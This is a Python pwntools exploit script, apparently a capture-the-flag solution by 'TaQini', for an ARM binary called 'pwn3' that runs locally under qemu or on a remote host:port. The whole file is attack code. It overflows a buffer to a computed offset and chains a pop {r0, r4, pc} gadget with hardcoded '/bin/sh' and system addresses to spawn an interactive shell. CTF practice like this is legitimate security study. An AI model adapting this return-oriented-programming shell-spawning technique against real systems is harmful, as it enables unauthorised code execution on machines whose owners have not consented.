#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './pwn3'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(['qemu-arm','-g','1234','-L','/usr/arm-linux-gnueabi/','./pwn3'])
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch
context.terminal = ['/usr/bin/qemu-arm']

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
pop_r0_r4_pc = 0x0001fb5c # pop {r0, r4, pc}

# elf, libc
binsh  = 0x00049018
system = 0x00014b5c+1

# rop1
offset = cyclic_find('kaab') 
payload = 'A'*offset
payload += p32(pop_r0_r4_pc)+p32(binsh)+p32(0)+p32(system)

ru('buffer: ')
# debug()
pause()
sl(payload)

# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

